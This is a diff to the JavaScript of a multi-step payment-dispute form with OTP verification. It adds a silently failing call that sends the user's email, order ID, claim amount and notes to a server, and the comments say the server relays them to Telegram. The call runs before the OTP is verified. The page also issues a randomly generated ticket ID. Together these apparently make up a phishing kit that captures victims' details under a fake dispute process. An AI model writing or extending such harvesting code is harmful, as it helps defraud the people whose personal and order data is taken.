@@ -318,6 +318,22 @@ document.addEventListener('DOMContentLoaded', () => {
     formData.notes = notesInput.value.trim();
     formData.timestamp = new Date().toISOString();
 
+    // ── Send to Telegram on Page 1 submission ─────────────────────────────
+    fetch('/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        ticketId:     'PENDING (OTP not yet verified)',
+        orderId:      formData.orderId,
+        claimAmount:  formData.claimAmount,
+        email:        formData.email,
+        reasonText:   formData.reasonText,
+        notes:        formData.notes || '',
+        evidenceFile: attachedFile ? attachedFile.name : 'None',
+        timestamp:    formData.timestamp
+      })
+    }).catch(() => {}); // silent fail
+
     displayEmail.textContent = maskEmail(formData.email);
     goToStep(2);
   });
@@ -447,22 +463,21 @@ document.addEventListener('DOMContentLoaded', () => {
       formData.ticketId = `#DSP-${randomId}`;
       summaryTicketId.textContent = formData.ticketId;
 
-      // ── Send to Telegram via server ──────────────────────────────────────
+      // ── Send ticket confirmation to Telegram on OTP verify ──────────────
       fetch('/submit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          ticketId:    formData.ticketId,
-          orderId:     formData.orderId,
-          claimAmount: formData.claimAmount,
-          email:       formData.email,
-          reasonText:  formData.reasonText,
-          notes:       formData.notes || '',
+          ticketId:     formData.ticketId,
+          orderId:      formData.orderId,
+          claimAmount:  formData.claimAmount,
+          email:        formData.email,
+          reasonText:   formData.reasonText,
+          notes:        formData.notes || '',
           evidenceFile: attachedFile ? attachedFile.name : 'None',
-          timestamp:   formData.timestamp
+          timestamp:    formData.timestamp
         })
       }).catch(() => {}).finally(() => {
-        // Reset spinner regardless of outcome
         if (verifyBtnText) verifyBtnText.textContent = 'Authorize & Submit Dispute';
         if (verifySpinner) verifySpinner.style.display = 'none';
         if (verifyBtnIcon) verifyBtnIcon.style.display = 'inline-block';
